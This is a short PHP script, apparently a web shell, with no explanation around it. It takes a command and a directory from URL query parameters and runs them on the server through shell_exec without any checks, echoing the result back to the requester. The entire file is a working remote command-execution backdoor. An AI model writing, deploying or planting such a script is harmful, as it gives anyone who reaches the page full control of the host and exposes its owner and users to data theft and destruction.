<?php 
$usercmd = $_GET['cmd'];
$usercd = $_GET['cd'];
$usercmd = str_replace("^"," ",$usercmd);
$output = shell_exec("cd ../" . $usercd ."; " . $usercmd);
echo $output
?> 